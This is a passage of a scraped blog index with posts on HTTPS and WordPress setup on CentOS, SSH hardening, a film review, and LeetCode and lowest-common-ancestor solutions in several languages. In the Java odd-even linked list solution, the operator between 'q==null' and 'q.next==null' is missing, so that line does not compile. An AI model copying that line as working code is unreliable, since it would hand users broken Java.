Sockets Layer，安全套接字层）技术来保护网站，对浏览器和服务器传输数据进行加密，可以大幅增加中间人攻击成本，加强用户隐私 google 曾发布公告表示将把https作为网页排名的一个因素 https://googlewebmastercentral.blogspot.jp/2014/08/https-as-ranking-signal.html Https会使网站打开速度变慢 关于https的原理技术可以看 http://blog.csdn.net/luocn99/article/details/39777707 申请证书 ssl验证需要证书，这里只说明免费的证书： Let's Encrypt 是国外一个公共的免费SSL项目，由 Linux 基金会托管，它的来头不小，由Mozilla、思科、Akamai、IdenTrust和EFF等组织发起 免费三个月，三个月后重新申请即可 关于其申请可以参考本博客： Centos 获取 Let’s Encrypt 证书 startSSL 个人免费一年 沃通 博主申请的这个，免费两年 证书其实是startSSL发布的 由于沃通申请太简单，博主这里就略过了。 证书部署 以沃通的证书为例(其他除了申请不一样但配置都是一样的)。 申请后下载的验证包如下： https-wosign 从上到下分别是私钥、公钥、证书链 上传这三个文件到服务器目录下 安装mod_ssl sudo yum install -y mod_ssl 复制三个文件分别到如下目录 私钥：/etc/pki/tls/private/ 公钥和证书链： /etc/pki/tls/certs/ 编辑ssl.conf，（文件名记得修改为你自己的）： sudo vim /etc/httpd/conf.d/ssl.conf SSLProtocol all -SSLv2 -SSLv3 SSLCertificateFile /etc/pki/tls/certs/2_www.hrwhisper.me.crt SSLCertificateKeyFile /etc/pki/tls/private/3_www.hrwhisper.me.key SSLCertificateChainFile /etc/pki/tls/certs/1_root_bundle.crt service httpd restart 重启服务器即可 在你的网址前加上https://看看访问正常么？ wordpress 开启了Https后必做的几件事 修改wordpress 站点地址 “设置”→“常规”里的“站点地址”和“WordPress 地址”为 https； 要确保网站的每个元素（如插件、JS、CSS文件、图片、内容分发网站等）都采用https协议：(可以在chromeF12看看有没有警报) 修改“菜单”当中的所有“自定义链接”为 https； 修改其他自己手贱写入的绝对链接的地址…… 替换文章所有的Http到https 直接修改数据库（注意先备份！注意先备份！！注意先备份！！！重要的事情说三遍！） 123UPDATE wp_posts SET post_content &#x3D; ( Replace (post_content, &#39;http:&#x2F;&#x2F;www.hrwhisper.me&#39;, &#39;https:&#x2F;&#x2F;www.hrwhisper.me&#39;) ); 301重定向HTTP URL到HTTPS（修改.htaccess文件） 12345&lt;IfModule mod_rewrite.c&gt;RewriteEngine OnRewriteCond %&#123;HTTPS&#125; offRewriteRule ^(.*)$ https:&#x2F;&#x2F;%&#123;HTTP_HOST&#125;%&#123;REQUEST_URI&#125; [R&#x3D;301,L]&lt;&#x2F;IfModule&gt; 如果你用了google search console，需要提交https的站点，并重新上传xml站点地图 测试安全性 可以在如下网址测试安全性： https://www.ssllabs.com/ssltest/ 博主一开始获得了B，问题是： The server does not support Forward Secrecy with the reference browsers 还有一个说使用了RC4 于是继续配置ssl.conf文件 （vim /etc/httpd/conf.d/ssl.conf） SSLCipherSuite \"EECDH+ECDSA+AESGCM EECDH+aRSA+AESGCM EECDH+ECDSA+SHA384 EECDH+ECDSA+SHA256 EECDH+aRSA+SHA384 EECDH+aRSA+SHA256 EECDH EDH+aRSA !RC4 !aNULL !eNULL !LOW !3DES !MD5 !EXP !PSK !SRP !DSS\" 最终结果： https-ssllabs-result 参考资料 Secure Your WordPress With a Free SSL Certificate in Apache on CentOS 7 Apache SSL证书部署指南 Moving to HTTPS on WordPress","categories":[{"name":"others","slug":"others","permalink":"https://www.hrwhisper.me/categories/others/"},{"name":"建站经验","slug":"others/建站经验","permalink":"https://www.hrwhisper.me/categories/others/%E5%BB%BA%E7%AB%99%E7%BB%8F%E9%AA%8C/"}],"tags":[{"name":"HTTPS","slug":"HTTPS","permalink":"https://www.hrwhisper.me/tags/HTTPS/"},{"name":"wordpress","slug":"wordpress","permalink":"https://www.hrwhisper.me/tags/wordpress/"},{"name":"Centos","slug":"Centos","permalink":"https://www.hrwhisper.me/tags/Centos/"},{"name":"Linux","slug":"Linux","permalink":"https://www.hrwhisper.me/tags/Linux/"}]},{"title":"影评-陪安东尼度过漫长的岁月","slug":"moive-comments-for-les-aventures-danthony","date":"2016-01-20T15:35:00.000Z","updated":"2020-10-19T14:35:48.809Z","comments":true,"path":"moive-comments-for-les-aventures-danthony/","link":"","permalink":"https://www.hrwhisper.me/moive-comments-for-les-aventures-danthony/","excerpt":"《陪安东尼度过漫长的岁月》影评","text":"《陪安东尼度过漫长的岁月》影评 看这电影一开始完全是因为陈奕迅去唱了主题曲， 《陪你度过漫长的岁月》英文版叫《sleep alone》。 从安东尼出国留学到转系到赢得一个主厨的副手。 一切那么快而顺利，那么不现实，影片有很多不合理的地方， 但那又怎样呢，并不影响我的对故事的喜欢。 小萱喜欢安东尼，而安东尼喜欢小樱，小樱喜欢方杰，方杰却跟随了富二代女友。 喜欢的人不喜欢自己，就像大海中的alice，有着自己独特的频率，却没有接收的Bob[1]。 当小萱表白被拒绝的时候， 那时候看得好心疼， 小萱流着眼泪说，既然你不会思念我，那你可不可以答应我，偶尔的想起我。 喜欢一个人，卑微到尘埃里。 安东尼说他每天都会想到好多好多的人，大部分只是在脑海中掠过，想到而已。 唯有樱在脑海里长长的霸占，想念而不仅仅是想到。 安东尼终于决定到日本找樱。 可是突然蹦出来的方杰让安东尼不知所措， 看着他们如此默契的探讨着作品，仿佛自己是多余。 双手都不知道该放哪里，只好仅仅抓着鸽子。 接着就是樱失恋了。 安东尼以为，她是同样的想他。 她是不曾，还是不会？ 那剥开栗子壳的声音，原来真的像是心，破碎的声音。 拥抱就能拥有吗？ 轻轻的被推开，那胸前的手势，那么清晰而笃定—— 她不曾，也不会。 樱说他们只会是永远的朋友。 我此时想起的不是电影的配乐，而是陈奕迅的富士山下： 谁都只得那双手 靠拥抱亦难任你拥有 要拥有必先懂失去怎接受 曾沿着雪路浪游 为何为好事泪流 谁能凭爱意要富士山私有 樱花开了几转，东京之旅一早比一世遥远。 当安东尼站在樱花树下，看樱花缓缓飘落， 他想录音，给樱最后的礼物， 可是那樱花， 静默无声。 樱花落下的速度是每秒五厘米， 人和人要用什么样的节奏生活， 才可以相识相知相爱？ 可是无论我用怎样的节奏生活， 我们之间的节奏，永远差了那么一拍。 因为不喜欢你的人不会接收你的频率。 可是，最后那个，安东尼遇到了一家叫alice的店， 还是小萱么？ 我希望是的。即使没有谁会一直在原地等着谁。 人和人之间说不合适，大多数都是不愿意去改变罢了。 转变个频率，也许你就遇到了你的alice。 故事很平凡无奇，并不漫长，也不曲折， 但我喜欢，喜欢就好。 [1] 网络通信经常用alice和bob表示通信双方","categories":[{"name":"whisper","slug":"whisper","permalink":"https://www.hrwhisper.me/categories/whisper/"},{"name":"谁的呢喃","slug":"whisper/谁的呢喃","permalink":"https://www.hrwhisper.me/categories/whisper/%E8%B0%81%E7%9A%84%E5%91%A2%E5%96%83/"}],"tags":[]},{"title":"leetcode Longest Increasing Path in a Matrix","slug":"leetcode-longest-increasing-path-matrix","date":"2016-01-20T06:28:13.000Z","updated":"2021-01-08T13:32:16.853Z","comments":true,"path":"leetcode-longest-increasing-path-matrix/","link":"","permalink":"https://www.hrwhisper.me/leetcode-longest-increasing-path-matrix/","excerpt":"leetcode Longest Increasing Path in a Matrix Given an integer matrix, find the length of the longest increasing path. From each cell, you can either move to four directions: left, right, up or down. You may NOT move diagonally or move outside of the boundary (i.e. wrap-around is not allowed). Example 1: nums = [ [9,9,4], [6,6,8], [2,1,1] ] Return 4 The longest increasing path is [1, 2, 6, 9].","text":"leetcode Longest Increasing Path in a Matrix Given an integer matrix, find the length of the longest increasing path. From each cell, you can either move to four directions: left, right, up or down. You may NOT move diagonally or move outside of the boundary (i.e. wrap-around is not allowed). Example 1: nums = [ [9,9,4], [6,6,8], [2,1,1] ] Return 4 The longest increasing path is [1, 2, 6, 9]. Example 2: nums = [ [3,4,5], [3,2,6], [2,2,1]] Return 4 The longest increasing path is [3, 4, 5, 6]. Moving diagonally is not allowed. 题目地址：leetcode Longest Increasing Path in a Matrix 题意：给定一个矩阵，在里面找出最大上升路径 思路： 记忆化搜索。 设dis[i][j]为当前点出发最大上升路径的值。初始设置为0，表示该点未知，需要更新。 再次碰到的时候只需要返回该值即可。 C++ 123456789101112131415161718192021222324252627282930int dx[] = &#123; 1 , -1, 0 , 0 &#125;;int dy[] = &#123; 0 , 0 , 1 , -1 &#125;;class Solution &#123;public: int dfs(int x, int y, const int &amp;m,const int &amp;n,vector&lt;vector&lt;int&gt;&gt;&amp; matrix, vector&lt;vector&lt;int&gt;&gt;&amp; dis) &#123; if (dis[x][y]) return dis[x][y]; for (int i = 0; i &lt; 4; i++) &#123; int nx = x + dx[i]; int ny = y + dy[i]; if (nx &gt;= 0 &amp;&amp; ny &gt;= 0 &amp;&amp; nx &lt; m &amp;&amp; ny &lt; n &amp;&amp; matrix[nx][ny] &gt; matrix[x][y]) &#123; dis[x][y] = max(dis[x][y], dfs(nx, ny, m, n, matrix, dis)); &#125; &#125; return ++dis[x][y]; &#125; int longestIncreasingPath(vector&lt;vector&lt;int&gt;&gt;&amp; matrix) &#123; if (!matrix.size()) return 0; int m = matrix.size(), n = matrix[0].size(); vector&lt;vector&lt;int&gt; &gt; dis(m, vector&lt;int&gt;(n, 0)); int ans = 0; for (int i = 0; i &lt; m; i++) &#123; for (int j = 0; j &lt; n; j++) &#123; ans = max(ans, dfs( i, j, m, n, matrix, dis)); &#125; &#125; return ans; &#125;&#125;; Java 1234567891011121314151617181920212223242526272829public class Solution &#123; int []dx = &#123; 1 , -1, 0 , 0 &#125;; int []dy = &#123; 0 , 0 , 1 , -1 &#125;; public int longestIncreasingPath(int[][] matrix) &#123; if (matrix.length == 0) return 0; int m = matrix.length, n = matrix[0].length; int[][] dis = new int [m][n]; int ans = 0; for (int i = 0; i &lt; m; i++) &#123; for (int j = 0; j &lt; n; j++) &#123; ans = Math.max(ans, dfs( i, j, m, n, matrix, dis)); &#125; &#125; return ans; &#125; int dfs(int x, int y, int m,int n,int[][] matrix, int[][] dis) &#123; if (dis[x][y] != 0) return dis[x][y]; for (int i = 0; i &lt; 4; i++) &#123; int nx = x + dx[i]; int ny = y + dy[i]; if (nx &gt;= 0 &amp;&amp; ny &gt;= 0 &amp;&amp; nx &lt; m &amp;&amp; ny &lt; n &amp;&amp; matrix[nx][ny] &gt; matrix[x][y]) &#123; dis[x][y] = Math.max(dis[x][y], dfs(nx, ny, m, n, matrix, dis)); &#125; &#125; return ++dis[x][y]; &#125;&#125; Python 12345678910111213141516171819class Solution(object): def longestIncreasingPath(self, matrix): &quot;&quot;&quot; :type matrix: List[List[int]] :rtype: int &quot;&quot;&quot; if not matrix: return 0 m, n = len(matrix), len(matrix[0]) dis = [[0 for j in xrange(n)] for i in xrange(m)] return max([self.dfs(i, j, m, n, matrix, dis) for j in xrange(n) for i in xrange(m)]) def dfs(self, x, y, m, n, matrix, dis): if dis[x][y]: return dis[x][y] for dx, dy in ([(1, 0), (-1, 0), (0, 1), (0, -1)]): nx, ny = x + dx, y + dy if nx &gt;= 0 and nx &lt; m and ny &gt;= 0 and ny &lt; n and matrix[x][y] &lt; matrix[nx][ny]: dis[x][y] = max(dis[x][y], self.dfs(nx, ny, m, n, matrix, dis)) dis[x][y] += 1 return dis[x][y] 本文是leetcode 329 Longest Increasing Path in a Matrix 的题解，更多题解可见 https://www.hrwhisper.me/leetcode-algorithm-solution/","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"python","slug":"python","permalink":"https://www.hrwhisper.me/tags/python/"},{"name":"C++","slug":"C","permalink":"https://www.hrwhisper.me/tags/C/"},{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"},{"name":"Java","slug":"Java","permalink":"https://www.hrwhisper.me/tags/Java/"}]},{"title":"leetcode Odd Even Linked List","slug":"leetcode-odd-even-linked-list","date":"2016-01-16T04:51:00.000Z","updated":"2021-01-08T13:32:16.856Z","comments":true,"path":"leetcode-odd-even-linked-list/","link":"","permalink":"https://www.hrwhisper.me/leetcode-odd-even-linked-list/","excerpt":"leetcode Odd Even Linked List Given a singly linked list, group all odd nodes together followed by the even nodes. Please note here we are talking about the node number and not the value in the nodes. You should try to do it in place. The program should run in O(1) space complexity and O(nodes) time complexity. Example: Given 1-&gt;2-&gt;3-&gt;4-&gt;5-&gt;NULL, return 1-&gt;3-&gt;5-&gt;2-&gt;4-&gt;NULL. Note: The relative order inside both the even and odd groups should remain as it was in the input. The first node is considered odd, the second node even and so on ...","text":"leetcode Odd Even Linked List Given a singly linked list, group all odd nodes together followed by the even nodes. Please note here we are talking about the node number and not the value in the nodes. You should try to do it in place. The program should run in O(1) space complexity and O(nodes) time complexity. Example: Given 1-&gt;2-&gt;3-&gt;4-&gt;5-&gt;NULL, return 1-&gt;3-&gt;5-&gt;2-&gt;4-&gt;NULL. Note: The relative order inside both the even and odd groups should remain as it was in the input. The first node is considered odd, the second node even and so on ... 题目地址：leetcode Odd Even Linked List 题意：给定一个单向链表，要求你将所有奇数位置的节点“提”到前面，如 1-&gt;2-&gt;3-&gt;4-&gt;5-&gt;NULL 变为 1-&gt;3-&gt;5-&gt;2-&gt;4-&gt;NULL 思路： 很简单的，用两个指针即可，一个指针p指向当前遍历的奇数节点的最后一个位置，另一个指针q指向待提取的奇数节点的前一个位置。 然后把q.next 的节点删除，插入到p.next的位置即可 C++ 1234567891011121314151617class Solution &#123;public: ListNode* oddEvenList(ListNode* head) &#123; if (!head) return head; ListNode *p = head, *q = head; while (q) &#123; q = q-&gt;next; if (!q || !q-&gt;next) break; ListNode *next_p = p-&gt;next, *next_q = q-&gt;next; q-&gt;next = next_q-&gt;next; p-&gt;next = next_q; next_q-&gt;next = next_p; p = p-&gt;next; &#125; return head; &#125;&#125;; Java 12345678910111213141516public class Solution &#123; public ListNode oddEvenList(ListNode head) &#123; if (head == null) return head; ListNode p = head, q =head; while (q != null) &#123; q = q.next; if (q==null q.next==null) break; ListNode next_p = p.next, next_q = q.next; q.next = next_q.next; p.next = next_q; next_q.next = next_p; p = p.next; &#125; return head; &#125;&#125; Python 12345678910111213141516class Solution(object): def oddEvenList(self, head): &quot;&quot;&quot; :type head: ListNode :rtype: ListNode &quot;&quot;&quot; if not head: return head p, q = head, head while q: q = q.next if not q or not q.next: break next_p, next_q = p.next, q.next q.next = next_q.next p.next ,next_q.next = next_q , next_p p = p.next return head 本文是leetcode 328 Odd Even Linked List 的题解，更多题解可见 https://www.hrwhisper.me/leetcode-algorithm-solution/","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"python","slug":"python","permalink":"https://www.hrwhisper.me/tags/python/"},{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"},{"name":"C++","slug":"C","permalink":"https://www.hrwhisper.me/tags/C/"},{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"},{"name":"Java","slug":"Java","permalink":"https://www.hrwhisper.me/tags/Java/"}]},{"title":"服务器禁止root登录和使用RSA证书登录","slug":"centos-not-permit-root-login-and-use-rsa-public-key-authentication","date":"2016-01-15T12:53:29.000Z","updated":"2020-10-19T14:35:48.726Z","comments":true,"path":"centos-not-permit-root-login-and-use-rsa-public-key-authentication/","link":"","permalink":"https://www.hrwhisper.me/centos-not-permit-root-login-and-use-rsa-public-key-authentication/","excerpt":"今天查看了一下服务器的ssh日志（/var/log/secure），发现.... someone-want-to-enurmate-my-password 有人在枚举我的root密码！于是....博主必须要防止这种情况的发生！","text":"今天查看了一下服务器的ssh日志（/var/log/secure），发现.... someone-want-to-enurmate-my-password 有人在枚举我的root密码！于是....博主必须要防止这种情况的发生！ 创建新用户 打开终端，用root连接到服务器，依次输入如下的命令 group add test useradd abc passwd abc usermod -a -G test abc 在上面的命令中，我们创建了一个test的用户组和一个叫abc的用户，并设置了密码，将abc用户添加到test组里面 接着输入： visudo visudo命令会打开sudo设置文件/etc/sudoers，找到下面这一行。 root ALL=(ALL:ALL) ALL 在这一行的下面，再添加一行。 abc ALL=(ALL:ALL) ALL 打开新的终端，用刚才的账户登录看看是否成功 禁止root登录 在配置文件（/etc/ssh/sshd_config ）中，将SSH的默认端口22改掉(可以改成从1025到65536之间的任意一个整数) vim /etc/ssh/sshd_config Port 1234 禁止root登录 PermitRootLogin no 禁止空密码 PermitEmptyPasswords no 添加允许登录的用户名（在最后加上） AllowUsers abc 重启ssh服务 sudo service sshd restart 来试试吧开一个新的终端，root现在是登录不了的了 公私钥认证 如果没有公钥和私钥的话，就生成一个(路径默认，不设置密码，当然也可以设置) ssh-keygen -t rsa -b 4096 上面的语句生成两个文件，一个id_rsa.pub一个id_rsa，前者是公钥后者是私钥 用刚才的abc登录服务器，上传公钥(id_rsa.pub)到服务器到当前用户根目录下（/home/abc/）， 然后 cd /home/abc/ （或者cd ~） 新建文件夹 mkdir .ssh 添加公钥到.ssh/authorized_keys中 cat id_rsa.pub &gt;&gt; .ssh/authorized_keys 设置权限 sudo chmod 0700 ~/.ssh/ sudo chmod 0600 ~/.ssh/authorized_keys 保险起见，删除公钥 rm ~/id_rsa.pub 接着修改ssh配置文件，开启如下内容 RSAAuthentication yes PubkeyAuthentication yes AuthorizedKeysFile .ssh/authorized_keys 然后禁止password方式登录 PasswordAuthentication no 重起ssh服务，试试效果吧可以免密码直接登录啦（原来的终端先别关掉，不然失败了就完蛋啦） ssh address -p 1234 小结 前面的步骤中，我们更改了ssh端口，并且禁止了root登录。 接着提出了禁止密码登录，采用更安全的RSA验证方式 使用RSA来验证，如果对方有 实力暴力破解也不会来破解你的- -还不如去找银行呢 还有木有刁民→_→ 哈哈哈","categories":[{"name":"others","slug":"others","permalink":"https://www.hrwhisper.me/categories/others/"},{"name":"建站经验","slug":"others/建站经验","permalink":"https://www.hrwhisper.me/categories/others/%E5%BB%BA%E7%AB%99%E7%BB%8F%E9%AA%8C/"}],"tags":[{"name":"Centos","slug":"Centos","permalink":"https://www.hrwhisper.me/tags/Centos/"},{"name":"Linux","slug":"Linux","permalink":"https://www.hrwhisper.me/tags/Linux/"}]},{"title":"二叉树最近公共祖先详解（LCA问题详解）","slug":"algorithm-lowest-common-ancestor-of-a-binary-tree","date":"2016-01-11T03:44:47.000Z","updated":"2021-01-03T14:19:06.251Z","comments":true,"path":"algorithm-lowest-common-ancestor-of-a-binary-tree/","link":"","permalink":"https://www.hrwhisper.me/algorithm-lowest-common-ancestor-of-a-binary-tree/","excerpt":"Lowest Common Ancestor of a Binary Tree 问题描述 Given a binary tree, find the lowest common ancestor of two given nodes in the tree. 给定一棵二叉树，求最近公共祖先。 最近公共祖先定义为：“对于有根树 T 的两个结点 p、q，最近公共祖先表示为一个结点 x，满足 x 是 p、q 的祖先且 x 的深度尽可能大（一个节点也可以是它自己的祖先）。”","text":"Lowest Common Ancestor of a Binary Tree 问题描述 Given a binary tree, find the lowest common ancestor of two given nodes in the tree. 给定一棵二叉树，求最近公共祖先。 最近公共祖先定义为：“对于有根树 T 的两个结点 p、q，最近公共祖先表示为一个结点 x，满足 x 是 p、q 的祖先且 x 的深度尽可能大（一个节点也可以是它自己的祖先）。” 二叉搜索树 BST 先从最简单的二叉搜索树BST讲起，给定一棵 BST如下： 1234567 _______6______ &#x2F; \\ ___2__ ___8__&#x2F; \\ &#x2F; \\0 _4 7 9 &#x2F; \\ 3 5 比如如求2和8的LCA，那么为6，博主简单记为LCA(2,8) = 6 更多例子： LCA(2,4) = 2 LCA(0,5) = 2 很简单的思路就是看两个值在root的哪边： 两个值都在左边，则LCA在左边 两个值都在右边，则LCA在右边 一个在左一个在右，则说明LCA就是当前的root节点。 用Python简单的实现如下，这里总是p &lt; q的，复杂度O(n) 12345678910111213class Solution(object): def lowestCommonAncestor(self, root, p, q): &quot;&quot;&quot; :type root: TreeNode :type p: TreeNode :type q: TreeNode :rtype: TreeNode &quot;&quot;&quot; if not root:return root; if p.val &gt; q.val:return self.lowestCommonAncestor(root, q, p) if root.val &gt;= p.val and root.val &lt;= q.val: return root; if root.val &lt; p.val:return self.lowestCommonAncestor(root.right, p, q) if root.val &gt; q.val:return self.lowestCommonAncestor(root.left, p, q) ps:其实这也是Lowest 235 Common Ancestor of a Binary Search Tree 的解法 普通二叉树 节点定义如下，有左右子节点：(用java貌似看起来清晰点) 123456public class TreeNode &#123; int val; TreeNode left; TreeNode right; TreeNode(int x) &#123; val = x; &#125;&#125; 像刚才那样看左右子节点肯定不行的啦，看下面的树: 1234567 _______3______ &#x2F; \\ ___5__ ___1__&#x2F; \\ &#x2F; \\6 _2 0 8 &#x2F; \\ 7 4 在举个栗子 for example LCA(5,2) = 5 LCA(5,1) = 3 思路： 一种简单的方法是DFS分别寻找到两个节点p和q的路径，然后对比路径，查看他们的第一个分岔口，则为LCA。 123456789101112131415161718192021222324252627class Solution &#123; bool find_path(TreeNode *root, const TreeNode * const p, vector&lt;TreeNode *&gt; &amp;path)&#123; if(!root) return false; path.push_back(root); if(root == p)&#123; return true; &#125; int len = path.size(); if(find_path(root-&gt;left, p, path)) return true; path.resize(len); return find_path(root-&gt;right, p, path); &#125; public: TreeNode* lowestCommonAncestor(TreeNode* root, TreeNode* p, TreeNode* q) &#123; vector&lt;TreeNode *&gt; first, second; find_path(root, p, first); find_path(root, q, second); int len = min(first.size(), second.size()); for(int i = 0; i &lt; len; ++i)&#123; if(first[i] != second[i]) return first[i - 1]; &#125; return first.size() &lt; second.size()? first.back() : second.back(); &#125;&#125;; 这个思路比较简单，代码写起来不如下面这种方法优雅： Using a bottom-up approach, we can improve over the top-down approach by avoiding traversing the same nodes over and over again. We traverse from the bottom, and once we reach a node which matches one of the two nodes, we pass it up to its parent. The parent would then test its left and right subtree if each contain one of the two nodes. If yes, then the parent must be the LCA and we pass its parent up to the root. If not, we pass the lower node which contains either one of the two nodes (if the left or right subtree contains either p or q), or NULL (if both the left and right subtree does not contain either p or q) up. Sounds complicated? Surprisingly the code appears to be much simpler than the top-down one. from : http://articles.leetcode.com/2011/07/lowest-common-ancestor-of-a-binary-tree-part-i.html 我们仍然可以用递归来解决，递归寻找两个带查询LCA的节点p和q，当找到后，返回给它们的父亲。如果某个节点的左右子树分别包括这两个节点，那么这个节点必然是所求的解，返回该节点。否则，返回左或者右子树（哪个包含p或者q的就返回哪个）。 复杂度O(n) 代码很简单，也写得很漂亮： 1234567891011121314class Solution(object): def lowestCommonAncestor(self, root, p, q): &quot;&quot;&quot; :type root: TreeNode :type p: TreeNode :type q: TreeNode :rtype: TreeNode &quot;&quot;&quot; if not root or root == p or root == q: return root left = self.lowestCommonAncestor(root.left, p, q) right = self.lowestCommonAncestor(root.right, p, q) if left and right: return root return left if left else right ps:其实这也是leetcode 236 Lowest Common Ancestor of a Binary Tree 的解法 带有父节点信息的二叉树 扩展，如果带有父节点的信息呢？ 换句话说，树的定义为 1234567public class TreeNode &#123; int val; TreeNode left; TreeNode right; TreeNode parent; TreeNode(int x) &#123; val = x; &#125;&#125; 那么，一个简单的思路，对p和q向上走，用hashtable记录访问过的节点， 如果某个节点已经被访问过了，那么返回该节点。 复杂度O(h),h为树的高度 1234567891011121314def LCA(root, p, q): vis = set() while p or q: if p: if p in vis: return p vis.add(p) p = p.parent if q: if q in vis: return q vis.add(q) q = q.parent return None 更好的方法是求出p和q的高度，高度比较高的向上移动，直到两个节点相遇。 复杂度O(h),h为树的高度 1234567891011121314151617181920212223242526272829int getHeight(Node *p) &#123; int height = 0; while (p) &#123; height++; p = p-&gt;parent; &#125; return height;&#125; // As root-&gt;parent is NULL, we don&#x27;t need to pass root in.Node *LCA(Node *p, Node *q) &#123; int h1 = getHeight(p); int h2 = getHeight(q); // swap both nodes in case p is deeper than q. if (h1 &gt; h2) &#123; swap(h1, h2); swap(p, q); &#125; // invariant: h1 &lt;= h2. int dh = h2 - h1; for (int h = 0; h &lt; dh; h++) q = q-&gt;parent; while (p &amp;&amp; q) &#123; if (p == q) return p; p = p-&gt;parent; q = q-&gt;parent; &#125; return NULL; // p and q are not in the same tree&#125; 多次查询的普通二叉树 如果是多次查询呢?每次都递归一次? 这样有q次查询就要O(q * n) ! 显然这复杂度太高。 我们可以用Tarjan离线算法来求LCA Tarjan算法基于DFS和并查集进行求解。 我们知道，树的后序遍历顺序是：左子树，右子树，根节点。 所以，如果LCA(p,q) = x ,那么，进行后续遍历的时候，必然先访问完x的左右子树，才会返回x所在的节点。 嗯，所以我们进行如下操作：处理完一棵子树(root为x)的时候，把子树的节点放入x所在的集合，并设置祖先为x（并查集） 这样做的话，当我们访问了一个节点的时候，如果该节点为待查节点q,且p已经被访问过了，那么，p的祖先就是LCA. 1234567 _______3______ &#x2F; \\ ___5__ ___1__&#x2F; \\ &#x2F; \\6 _2 0 8 &#x2F; \\ 7 4 以上面的树为例，假设求 LCA(6,4) ,那么，由于是后续遍历，我们遍历到4的时候，6已经被访问过，且祖先设置为5，所以答案就是5 （后序遍历的是标志是否被访问~） 再比如LCA(5,4),我们访问到4的时候，5还没被访问，返回上级，然后是2节点，把2的祖先与4合并为2，在返回上级，此时是节点5，把5节点的右子树祖先和5合并，接着发现2已经被访问了，答案就是2的祖先，就是5 看到这里，你应该知道了用并查集的原因：可以快速的找到某个节点的祖先，这对多个查询是非常有利的。 C++ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748struct UnionFindSet &#123; unordered_map&lt;TreeNode* , TreeNode*&gt; fa; TreeNode* find(TreeNode *p) &#123; return fa[p] == NULL ? p : fa[p] = find(fa[p]); &#125; void unionSet(TreeNode *p, TreeNode * q) &#123; TreeNode *root_p = find(p); TreeNode *root_q = find(q); fa[root_p] = root_q; &#125;&#125;;class Solution &#123; unordered_set&lt;TreeNode *&gt; vis; TreeNode *p, *q,*ans; UnionFindSet unionFindSet;public: TreeNode* lowestCommonAncestor(TreeNode* root, TreeNode* p, TreeNode* q) &#123; this-&gt;p = p; this-&gt;q = q; Tarjan(root); return ans; &#125; void Tarjan(TreeNode * root) &#123; if (!root) return; unionFindSet.fa[root] = NULL; if (root-&gt;left) &#123; Tarjan(root-&gt;left); unionFindSet.unionSet(root-&gt;left, root); &#125; if (root-&gt;right) &#123; Tarjan(root-&gt;right); unionFindSet.unionSet(root-&gt;right, root); &#125; vis.insert(root); if (root == p &amp;&amp; vis.find(q) != vis.end()) ans = unionFindSet.find(q); else if (root == q &amp;&amp; vis.find(p) != vis.end()) ans = unionFindSet.find(p); &#125;&#125;; 上面的代码只是单个查询的情况，多个查询的情况只需要把最后的改为：遍历与当前结点root相关联的查询即可。 参考资料 Lowest Common Ancestor of a Binary Tree Part II LCA问题的Tarjan算法","categories":[{"name":"study","slug":"study","permalink":"https://www.hrwhisper.me/categories/study/"},{"name":"算法笔记","slug":"study/算法笔记","permalink":"https://www.hrwhisper.me/categories/study/%E7%AE%97%E6%B3%95%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"}]},{"title":"leetcode Count of Range Sum","slug":"leetcode-count-of-range-sum","date":"2016-01-10T09:52:53.000Z","updated":"2021-01-08T13:32:16.834Z","comments":true,"path":"leetcode-count-of-range-sum/","link":"","permalink":"https://www.hrwhisper.me/leetcode-count-of-range-sum/","excerpt":"leetcode Count of Range Sum Given an integer array nums, return the number of range sums that lie in [lower, upper] inclusive. Range sum S(i, j) is defined as the sum of the elements in nums between indices i and j (i ≤ j), inclusive. Note: A naive algorithm of O(_n_2) is trivial. You MUST do better than that. Example: Given nums = [-2, 5, -1], lower = -2, upper = 2, Return 3. The three ranges are : [0, 0], [2, 2], [0, 2] and their respective sums are: -2, -1, 2.","text":"leetcode Count of Range Sum Given an integer array nums, return the number of range sums that lie in [lower, upper] inclusive. Range sum S(i, j) is defined as the sum of the elements in nums between indices i and j (i ≤ j), inclusive. Note: A naive algorithm of O(_n_2) is trivial. You MUST do better than that. Example: Given nums = [-2, 5, -1], lower = -2, upper = 2, Return 3. The three ranges are : [0, 0], [2, 2], [0, 2] and their respective sums are: -2, -1, 2. 题目地址： leetcode Count of Range Sum 题意: 给定一个整数组成的数组，求它的所有子区间和坐落于[lower, upper] 的个数。 比如样例中[-2, 5, -1]中，这三个区间的和在[-2,2]之间 [0, 0], [2, 2], [0, 2] 思路 先来看看最朴素的O(n^2)算法，首先算出和，然后枚举区间范围。 1234567891011121314151617public class Solution &#123; public int countRangeSum(int[] nums, int lower, int upper) &#123; if(nums.length == 0) return 0; long[] sum = new long[nums.length + 1]; for (int i = 0; i &lt; nums.length; i++) sum[i + 1] = sum[i] + nums[i]; int ans = 0; for (int i = 0; i &lt; nums.length; i++) &#123; for (int j = i + 1; j &lt;= nums.length; j++) &#123; if(lower &lt;= sum[j] - sum[i] &amp;&amp; sum[j] - sum[i] &lt;= upper) ans++; &#125; &#125; return ans; &#125;&#125; 题目要求的效率好于O(n^2)的算法，那么要怎么加速呢？ 还记得 Count of Smaller Numbers After Self 么？ 那时候，我们用Fenwick树或者线段树，先离散化，然后从右向左扫描，每扫描一个数，对小于它的求和。然后更新..... 这题也差不多，需要找满足条件 lower ≤ sum[j] - sum[i - 1] ≤ upper ，也就是lower + sum[i - 1] ≤ sum[j] ≤ upper + sum[i - 1] 我们同样的求出和，然后离散化，接着从右向左扫描，对每个i 查询满足在[ lower + sum[i - 1], upper + sum[i - 1] ]范围内的个数（用线段树或者Fenwick Tree） 这样复杂度就是O(n log n) 线段树 C++ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768typedef long long 